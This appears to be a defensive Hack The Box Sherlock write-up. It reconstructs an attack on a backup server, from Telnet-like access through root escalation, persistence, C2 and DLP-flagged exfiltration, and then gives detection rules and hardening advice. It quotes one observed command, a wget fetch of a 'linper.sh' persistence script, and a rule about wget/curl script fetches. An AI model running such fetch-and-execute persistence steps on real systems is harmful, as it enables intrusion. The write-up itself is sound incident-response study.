Platform: Hack The Box (Sherlock)

## Objective

Validate and reconstruct attacker behavior across initial access, privilege escalation, persistence, C2, and exfiltration using available telemetry (auth, process, network, DLP).

---

## Scenario Overview

- Target: low-activity backup server (high anomaly signal-to-noise).
- Attack focus: legacy remote-access service exploitation → privilege escalation → persistence → C2 → data exfiltration triggering DLP.

---

## Artifacts Observed

Authentication

- Unauthorized remote connection via Telnet-like service.
- Rapid escalation to root context.
- Creation of a new privileged local account outside standard workflows.

Process Execution

- Remote fetch and execution of attacker script:
  - wget https://raw.githubusercontent.com/<redacted>/linper.sh
- Indicates automated post-exploitation and persistence activities.

Network

- Persistent outbound connection to a single external IPv4 not in baseline.
- Traffic consistent with C2 beaconing following compromise.

Data / Exfiltration

- Access to structured customer database.
- Outbound transfer shortly after database interaction.
- Temporal alignment with DLP alert confirming sensitive data exposure.

---

## Investigation Methodology

Pivot-based correlation across logs and telemetry:

1. Initial Access
   - Review legacy service authentication logs — detected unauthorized Telnet-like session.
2. Privilege Escalation
   - Correlate session to elevated shell/process ownership (root).
3. Persistence
   - Inspect account creation and executed scripts — found non-standard privileged account and remote script retrieval.
4. C2 Correlation
   - Map outbound traffic to external host; analyze timing and beacon cadence.
5. Exfiltration Validation
   - Correlate DB access logs, outbound transfer, and DLP alert for confirmation.

---

## Timeline (condensed)

- T0: Unauthorized Telnet-like session established.
- T0 + minutes: Shell escalated to root; remote script fetched (wget).
- T0 + minutes: New privileged account created; persistence established.
- T0 + later: Outbound connection(s) to external IP — C2-like behavior.
- T0 + later: Database access and outbound transfer; DLP alert triggered.

---

## Key Findings

- Initial compromise via legacy remote access protocol vulnerability.
- Rapid attainment of administrative (root) privileges.
- Persistence achieved through unauthorized privileged account and execution of remote script.
- Ongoing outbound communication consistent with C2.
- Confirmed data access and exfiltration (DLP correlated).

---

## Recommendations (Actionable, prioritized)

1. Immediate
   - Isolate affected host and preserve full forensic image and logs.
   - Rotate credentials and review privileged accounts.
2. Short term
   - Remove legacy remote-access services or restrict to approved admin subnets/VPN.
   - Block identified external IP(s) and domains at network perimeter.
3. Detection & Rules
   - Alert: any legacy remote-access protocol usage on production hosts.
   - Alert: privileged account creation outside identity workflows.
   - Alert: process CLI with wget/curl fetching scripts from external locations.
   - Alert: outbound connections to new external IPs within X minutes of privilege escalation.
   - Consider rule: sequence detection—auth → root escalation → outbound to unknown IP.
4. Logging & Telemetry
   - Enable detailed command-line and process logging.
   - Centralize account lifecycle events to SIEM.
   - Improve network baselining for low-activity hosts.
5. Long term
   - Harden low-activity infrastructure and remove unsupported services.
   - Implement regular reviews for privileged accounts and scheduled audits.

---

## Defensive Takeaways

- Low-activity hosts offer high-value detection opportunities; prioritize telemetry completeness.
- Correlate DLP alerts with host forensic data to turn alerts into confirmed incidents.
- Behavior-based detection (sequence and timing) is effective for post-exploitation detection versus static indicators.

---

## Application to Portfolio

- Demonstrates cross-domain correlation (auth, process, network, DLP) to reconstruct attacker tradecraft.
- Supports development of behavior-based detection rules, DFIR reporting templates, and threat-hunting hypotheses focused on legacy-service abuse and rapid post-access activity.
